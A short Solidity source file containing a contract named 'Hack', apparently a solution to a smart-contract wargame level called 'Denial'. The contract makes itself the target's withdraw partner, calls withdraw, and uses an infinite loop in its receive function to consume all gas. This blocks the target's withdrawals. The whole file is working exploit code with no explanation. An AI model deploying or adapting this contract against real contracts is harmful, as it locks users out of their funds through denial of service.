// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function withdraw() external;
    function setWithdrawPartner(address _partner) external;
}


contract Hack {
    address private target;

    constructor (address _target) {
        target = _target;
    }

    function becomePartner() external {
        IDenial(target).setWithdrawPartner(address(this));
    }

    function attack() external {
        IDenial(target).withdraw();
    }

    receive() external payable {
        while (true) {} // infinity loop to lose all the gas 
    }
}
